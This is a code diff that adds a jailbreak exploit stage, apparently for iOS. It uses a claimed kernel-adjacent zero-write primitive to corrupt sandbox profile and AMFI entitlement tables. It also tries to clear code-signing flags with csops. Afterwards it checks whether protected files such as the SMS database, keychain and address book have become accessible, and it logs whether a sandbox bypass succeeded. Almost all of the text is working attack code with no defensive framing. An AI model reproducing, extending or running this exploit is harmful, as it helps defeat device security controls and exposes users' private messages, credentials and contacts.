@@ -30100,3 +30100,444 @@ void iosurface_sec_bypass(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+// ==========================================================================
+// JB28 — Direct Strike: zero-write to sandbox profile + AMFI + csops
+// Targets identified by JB27 recon on iOS 27.0 iPhone 13 Pro Max
+// ==========================================================================
+
+void iosurface_direct_strike(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        log(@"JB28: === Direct Strike: sandbox/AMFI/csops corruption ===");
+        log(@"JB28: Write primitivo CVE-2026-112611 — 4 zero bytes a addr elegida");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+
+        // Helper: sandbox_check baseline
+        typedef int (*sandbox_check_fn)(pid_t, const char *, int, ...);
+        sandbox_check_fn sbCheck = dlsym(RTLD_DEFAULT, "sandbox_check");
+        pid_t myPid = getpid();
+
+        typedef int (*csops_fn)(pid_t, unsigned int, void *, size_t);
+        csops_fn csops = dlsym(RTLD_DEFAULT, "csops");
+
+        // =====================================================================
+        // FASE 1: Baseline — estado actual de sandbox y codesign
+        // =====================================================================
+        log(@"JB28: === Fase 1: Baseline antes de writes ===");
+
+        const char *sbOps[] = { "file-read-data", "file-write-data", "process-exec",
+                                "process-fork", "mach-lookup", "sysctl-read", NULL };
+        int baselineDenied = 0;
+        if (sbCheck) {
+            for (int i = 0; sbOps[i]; i++) {
+                int rc = sbCheck(myPid, sbOps[i], 0);
+                if (rc != 0) baselineDenied++;
+                log([NSString stringWithFormat:@"JB28:   sandbox(%s) = %d", sbOps[i], rc]);
+            }
+        }
+        results[@"baselineDenied"] = @(baselineDenied);
+
+        uint32_t csBaseline = 0;
+        if (csops) {
+            csops(myPid, 0, &csBaseline, sizeof(csBaseline));
+            log([NSString stringWithFormat:@"JB28:   csops baseline = %#x", csBaseline]);
+            results[@"csBaseline"] = [NSString stringWithFormat:@"%#x", csBaseline];
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 2: Locate and dump libsystem_sandbox __DATA_CONST string table
+        // =====================================================================
+        log(@"JB28: === Fase 2: sandbox __DATA_CONST deep analysis ===");
+
+        uint64_t sbConstAddr = 0;
+        uint64_t sbConstSize = 0;
+        uint32_t imageCount = _dyld_image_count();
+
+        for (uint32_t img = 0; img < imageCount; img++) {
+            const char *imgName = _dyld_get_image_name(img);
+            if (!imgName || !strstr(imgName, "libsystem_sandbox")) continue;
+
+            const struct mach_header_64 *mh =
+                (const struct mach_header_64 *)(uintptr_t)_dyld_get_image_header(img);
+            if (!mh || mh->magic != MH_MAGIC_64) continue;
+            intptr_t slide = _dyld_get_image_vmaddr_slide(img);
+
+            const struct load_command *lc =
+                (const struct load_command *)((const char *)mh + sizeof(*mh));
+            for (uint32_t k = 0; k < mh->ncmds && lc; k++) {
+                if (lc->cmd == LC_SEGMENT_64) {
+                    const struct segment_command_64 *sc = (const void *)lc;
+                    if (strcmp(sc->segname, "__DATA_CONST") == 0) {
+                        sbConstAddr = sc->vmaddr + slide;
+                        sbConstSize = sc->vmsize;
+                    }
+                }
+                lc = (const struct load_command *)((const char *)lc + lc->cmdsize);
+            }
+            break;
+        }
+
+        if (sbConstAddr && sbConstSize) {
+            log([NSString stringWithFormat:@"JB28:   sandbox __DATA_CONST = %#llx size=%#llx",
+                 (unsigned long long)sbConstAddr, (unsigned long long)sbConstSize]);
+
+            uint64_t *p = (uint64_t *)(uintptr_t)sbConstAddr;
+            int nWords = (int)(sbConstSize / 8);
+            if (nWords > 13) nWords = 13;
+
+            for (int w = 0; w < nWords; w++) {
+                uint64_t val = p[w];
+                if (val > 0x100000000ULL && val < 0x300000000ULL) {
+                    const char *str = (const char *)(uintptr_t)val;
+                    char preview[64] = {0};
+                    int readable = 1;
+                    for (int c = 0; c < 60 && readable; c++) {
+                        if (str[c] == 0) break;
+                        if (str[c] < 0x20 || str[c] > 0x7e) { readable = 0; break; }
+                        preview[c] = str[c];
+                    }
+                    if (readable && preview[0]) {
+                        log([NSString stringWithFormat:@"JB28:     [%02d] %#018llx -> \"%s\"",
+                             w, (unsigned long long)val, preview]);
+                    } else {
+                        log([NSString stringWithFormat:@"JB28:     [%02d] %#018llx (not a string)",
+                             w, (unsigned long long)val]);
+                    }
+                } else {
+                    log([NSString stringWithFormat:@"JB28:     [%02d] %#018llx",
+                         w, (unsigned long long)val]);
+                }
+            }
+
+            results[@"sbConstAddr"] = [NSString stringWithFormat:@"%#llx", (unsigned long long)sbConstAddr];
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 3: Zero-write sandbox __DATA_CONST string pointers
+        // NULL the first sandbox profile string — may cause sandbox_check to fail open
+        // =====================================================================
+        log(@"JB28: === Fase 3: Zero-write a sandbox string table ===");
+
+        int sbWriteHits = 0;
+        if (sbConstAddr) {
+            uint64_t *p = (uint64_t *)(uintptr_t)sbConstAddr;
+            int nWords = (int)(sbConstSize / 8);
+            if (nWords > 6) nWords = 6;
+
+            for (int w = 0; w < nWords && !isr_stopped(); w++) {
+                uint64_t before = p[w];
+                if (before == 0) continue;
+
+                uint64_t targetAddr = sbConstAddr + w * 8;
+                log([NSString stringWithFormat:@"JB28:   NULLing sandbox const[%d] at %#llx (was %#llx)",
+                     w, (unsigned long long)targetAddr, (unsigned long long)before]);
+
+                jb27_zero_write(targetAddr, log);
+
+                uint32_t low4 = *(uint32_t *)(uintptr_t)targetAddr;
+                if (low4 == 0 && (before & 0xFFFFFFFF) != 0) {
+                    sbWriteHits++;
+                    log([NSString stringWithFormat:@"JB28:   [!!!] const[%d] low32 ZEROED: %#llx -> %#llx",
+                         w, (unsigned long long)before, (unsigned long long)p[w]]);
+                } else {
+                    log([NSString stringWithFormat:@"JB28:   const[%d] after: %#llx", w, (unsigned long long)p[w]]);
+                }
+            }
+
+            results[@"sbWriteHits"] = @(sbWriteHits);
+            log([NSString stringWithFormat:@"JB28: Sandbox const writes: %d hits", sbWriteHits]);
+
+            if (sbWriteHits > 0 && sbCheck) {
+                log(@"JB28:   --- Re-check sandbox after corruption ---");
+                int postDenied = 0;
+                for (int i = 0; sbOps[i]; i++) {
+                    int rc = sbCheck(myPid, sbOps[i], 0);
+                    if (rc != 0) postDenied++;
+                    log([NSString stringWithFormat:@"JB28:   sandbox(%s) = %d %s",
+                         sbOps[i], rc, (rc == 0) ? "<-- ALLOWED!" : ""]);
+                }
+                results[@"postSandboxDenied"] = @(postDenied);
+
+                if (postDenied < baselineDenied) {
+                    log([NSString stringWithFormat:@"JB28: [!!!] SANDBOX DEBILITADO: %d -> %d denegaciones",
+                         baselineDenied, postDenied]);
+                }
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 4: Zero-write AMFI entitlement string pointers
+        // =====================================================================
+        log(@"JB28: === Fase 4: Zero-write a AMFI entitlement table ===");
+
+        uint64_t amfiDataAddr = 0;
+        uint64_t amfiDataSize = 0;
+
+        for (uint32_t img = 0; img < imageCount; img++) {
+            const char *imgName = _dyld_get_image_name(img);
+            if (!imgName || !strstr(imgName, "AppleMobileFileIntegrity")) continue;
+
+            const struct mach_header_64 *mh =
+                (const struct mach_header_64 *)(uintptr_t)_dyld_get_image_header(img);
+            if (!mh || mh->magic != MH_MAGIC_64) continue;
+            intptr_t slide = _dyld_get_image_vmaddr_slide(img);
+
+            const struct load_command *lc =
+                (const struct load_command *)((const char *)mh + sizeof(*mh));
+            for (uint32_t k = 0; k < mh->ncmds && lc; k++) {
+                if (lc->cmd == LC_SEGMENT_64) {
+                    const struct segment_command_64 *sc = (const void *)lc;
+                    if (strcmp(sc->segname, "__DATA") == 0) {
+                        amfiDataAddr = sc->vmaddr + slide;
+                        amfiDataSize = sc->vmsize;
+                    }
+                }
+                lc = (const struct load_command *)((const char *)lc + lc->cmdsize);
+            }
+            break;
+        }
+
+        int amfiWriteHits = 0;
+        if (amfiDataAddr && amfiDataSize) {
+            uint64_t *p = (uint64_t *)(uintptr_t)amfiDataAddr;
+
+            // Target AMFI entitlement string pointers (indices 14-25 from JB27 results)
+            // These are entitlement name strings used for validation
+            for (int w = 14; w <= 25 && !isr_stopped(); w++) {
+                uint64_t before = p[w];
+                if (before == 0) continue;
+
+                // Dereference to verify it's a string pointer
+                const char *str = (const char *)(uintptr_t)before;
+                char preview[48] = {0};
+                int readable = 1;
+                for (int c = 0; c < 44 && readable; c++) {
+                    if (str[c] == 0) break;
+                    if (str[c] < 0x20 || str[c] > 0x7e) { readable = 0; break; }
+                    preview[c] = str[c];
+                }
+
+                if (readable && preview[0]) {
+                    log([NSString stringWithFormat:@"JB28:   AMFI[%d] -> \"%s\"", w, preview]);
+                }
+
+                uint64_t targetAddr = amfiDataAddr + w * 8;
+                log([NSString stringWithFormat:@"JB28:   NULLing AMFI[%d] at %#llx",
+                     w, (unsigned long long)targetAddr]);
+
+                jb27_zero_write(targetAddr, log);
+
+                uint32_t low4 = *(uint32_t *)(uintptr_t)targetAddr;
+                if (low4 == 0 && (before & 0xFFFFFFFF) != 0) {
+                    amfiWriteHits++;
+                    log([NSString stringWithFormat:@"JB28:   [!!!] AMFI[%d] ZEROED: %#llx -> %#llx",
+                         w, (unsigned long long)before, (unsigned long long)p[w]]);
+                } else {
+                    log([NSString stringWithFormat:@"JB28:   AMFI[%d] after: %#llx", w, (unsigned long long)p[w]]);
+                }
+            }
+
+            results[@"amfiWriteHits"] = @(amfiWriteHits);
+            log([NSString stringWithFormat:@"JB28: AMFI writes: %d hits", amfiWriteHits]);
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 5: csops flag manipulation — try to clear CS_HARD and CS_KILL
+        // =====================================================================
+        log(@"JB28: === Fase 5: csops flag analysis ===");
+        {
+            if (csops) {
+                uint32_t flags = 0;
+                csops(myPid, 0, &flags, sizeof(flags));
+                log([NSString stringWithFormat:@"JB28:   Current CS flags: %#x", flags]);
+
+                // CS_OPS_SET_STATUS = 6, try to clear CS_HARD (0x100) and CS_KILL (0x200)
+                uint32_t clearFlags = 0;
+                int csRc = csops(myPid, 6, &clearFlags, sizeof(clearFlags));
+                log([NSString stringWithFormat:@"JB28:   csops(SET_STATUS, 0) = %d errno=%d", csRc, errno]);
+
+                // Try CS_OPS_MARKINVALID = 5
+                int markRc = csops(myPid, 5, NULL, 0);
+                log([NSString stringWithFormat:@"JB28:   csops(MARKINVALID) = %d errno=%d", markRc, errno]);
+
+                // Check flags after attempts
+                uint32_t afterFlags = 0;
+                csops(myPid, 0, &afterFlags, sizeof(afterFlags));
+                log([NSString stringWithFormat:@"JB28:   CS flags after: %#x (changed=%s)",
+                     afterFlags, (afterFlags != flags) ? "YES" : "no"]);
+                results[@"csAfter"] = [NSString stringWithFormat:@"%#x", afterFlags];
+
+                if (afterFlags != flags) {
+                    log([NSString stringWithFormat:@"JB28: [!!!] CS FLAGS CHANGED: %#x -> %#x", flags, afterFlags]);
+                    results[@"csFlagsChanged"] = @YES;
+                }
+
+                // Try to get our own entitlements
+                // CS_OPS_ENTITLEMENTS_BLOB = 7
+                char entBuf[4096] = {0};
+                int entRc = csops(myPid, 7, entBuf, sizeof(entBuf));
+                if (entRc == 0) {
+                    // Parse the blob header: magic (4 bytes) + length (4 bytes) + plist data
+                    uint32_t magic = *(uint32_t *)entBuf;
+                    uint32_t blobLen = *(uint32_t *)(entBuf + 4);
+                    blobLen = __builtin_bswap32(blobLen); // big-endian
+                    log([NSString stringWithFormat:@"JB28:   Entitlements blob: magic=%#x len=%u", magic, blobLen]);
+
+                    if (blobLen > 8 && blobLen < sizeof(entBuf)) {
+                        NSData *plistData = [NSData dataWithBytes:entBuf + 8 length:blobLen - 8];
+                        NSError *err = nil;
+                        id plist = [NSPropertyListSerialization propertyListWithData:plistData
+                                    options:0 format:NULL error:&err];
+                        if (plist) {
+                            log([NSString stringWithFormat:@"JB28:   Entitlements: %@", plist]);
+                            results[@"entitlements"] = [plist description];
+                        } else {
+                            // Try as string
+                            NSString *raw = [[NSString alloc] initWithData:plistData encoding:NSUTF8StringEncoding];
+                            if (raw.length > 0) {
+                                NSString *trimmed = raw.length > 500 ? [raw substringToIndex:500] : raw;
+                                log([NSString stringWithFormat:@"JB28:   Entitlements raw: %@", trimmed]);
+                            }
+                        }
+                    }
+                } else {
+                    log([NSString stringWithFormat:@"JB28:   csops(ENTITLEMENTS) = %d errno=%d", entRc, errno]);
+                }
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 6: Post-corruption access tests
+        // =====================================================================
+        log(@"JB28: === Fase 6: Post-corruption access tests ===");
+        {
+            // Test file access to restricted paths
+            const char *paths[] = {
+                "/var/mobile/Library/Preferences/.GlobalPreferences.plist",
+                "/var/mobile/Library/Caches",
+                "/var/containers/Bundle",
+                "/var/db/MobileIdentity",
+                "/private/var/run/syslog",
+                "/var/mobile/Library/SMS/sms.db",
+                "/var/Keychains/keychain-2.db",
+                "/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
+                NULL
+            };
+
+            int accessible = 0;
+            for (int i = 0; paths[i]; i++) {
+                int canRead = (access(paths[i], 4) == 0); // R_OK = 4
+                int canWrite = (access(paths[i], 2) == 0); // W_OK = 2
+                if (canRead || canWrite) {
+                    accessible++;
+                    log([NSString stringWithFormat:@"JB28:   [!] %s R=%d W=%d", paths[i], canRead, canWrite]);
+                }
+            }
+            results[@"accessiblePaths"] = @(accessible);
+
+            // Try mach service lookups
+            typedef void *(*bootstrap_look_up_fn)(void *, const char *, unsigned int *);
+            bootstrap_look_up_fn bsLookup = dlsym(RTLD_DEFAULT, "bootstrap_look_up");
+
+            typedef unsigned int (*task_self_fn)(void);
+            task_self_fn mTaskSelf = dlsym(RTLD_DEFAULT, "mach_task_self");
+
+            if (bsLookup && mTaskSelf) {
+                const char *services[] = {
+                    "com.apple.mobile.installd",
+                    "com.apple.springboard.services",
+                    "com.apple.lsd.mapdb",
+                    "com.apple.backboardd",
+                    NULL
+                };
+
+                for (int i = 0; services[i]; i++) {
+                    unsigned int port = 0;
+                    int rc = (int)(intptr_t)bsLookup(NULL, services[i], &port);
+                    log([NSString stringWithFormat:@"JB28:   mach_lookup(%s) = %d port=%u",
+                         services[i], rc, port]);
+                    if (port > 0) {
+                        results[[NSString stringWithFormat:@"service_%d", i]] = @(port);
+                    }
+                }
+            }
+
+            // Try dlopen of private frameworks
+            void *amfiLib = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_LAZY);
+            if (amfiLib) {
+                log(@"JB28:   [!] libMobileGestalt loaded");
+                typedef void *(*MGCopyAnswer_fn)(void *);
+                MGCopyAnswer_fn mgCopy = dlsym(amfiLib, "MGCopyAnswer");
+                if (mgCopy) {
+                    log([NSString stringWithFormat:@"JB28:   MGCopyAnswer = %#llx",
+                         (unsigned long long)(uintptr_t)mgCopy]);
+                }
+                dlclose(amfiLib);
+            }
+
+            // Test writing to a temp location outside sandbox
+            const char *testPath = "/var/tmp/jb28_test_write";
+            FILE *testF = fopen(testPath, "w");
+            if (testF) {
+                fprintf(testF, "jb28_bypass_test");
+                fclose(testF);
+                log(@"JB28:   [!!!] WRITE to /var/tmp SUCCEEDED");
+                unlink(testPath);
+                results[@"varTmpWrite"] = @YES;
+            } else {
+                log([NSString stringWithFormat:@"JB28:   /var/tmp write: errno=%d", errno]);
+                results[@"varTmpWrite"] = @NO;
+            }
+        }
+
+        // =====================================================================
+        // VERDICT
+        // =====================================================================
+        log(@"JB28: =============================================");
+
+        int sbHits = [results[@"sbWriteHits"] intValue];
+        int amfiHits = [results[@"amfiWriteHits"] intValue];
+        int postDenied = [results[@"postSandboxDenied"] intValue];
+        BOOL csChanged = [results[@"csFlagsChanged"] boolValue];
+        BOOL varTmpOK = [results[@"varTmpWrite"] boolValue];
+        int accessible = [results[@"accessiblePaths"] intValue];
+
+        NSString *verdict = @"ANALYSIS_COMPLETE";
+
+        if (varTmpOK || (postDenied < baselineDenied && postDenied >= 0)) {
+            verdict = @"SANDBOX_BYPASS_ACHIEVED";
+            log(@"JB28: [!!!] SANDBOX BYPASS — acceso fuera del contenedor!");
+        } else if (csChanged) {
+            verdict = @"CODESIGN_FLAGS_MODIFIED";
+            log(@"JB28: [!!!] CODESIGN FLAGS CAMBIADOS — code injection posible");
+        } else if (sbHits > 0 || amfiHits > 0) {
+            verdict = @"WRITES_LANDED_TESTING_EFFECTS";
+            log([NSString stringWithFormat:@"JB28: Writes landed (sb=%d amfi=%d) — analizando efectos", sbHits, amfiHits]);
+            log([NSString stringWithFormat:@"JB28: Accesible paths: %d, postDenied: %d vs baseline: %d",
+                 accessible, postDenied, baselineDenied]);
+        } else {
+            verdict = @"NO_IMMEDIATE_EFFECT";
+            log(@"JB28: Writes no tuvieron efecto inmediato en sandbox/AMFI");
+            log(@"JB28: Posibles razones: __DATA_CONST remapeado read-only, kernel-side enforcement");
+            log(@"JB28: Siguiente: atacar GOT entries o dispatch tables en __AUTH_CONST");
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB28: Verdict: %@", verdict]);
+        log(@"JB28: =============================================");
+
+        isr_checkpoint(@"JB28-direct-strike-checkpoint.json", results);
+        done(results);
+    });
+}
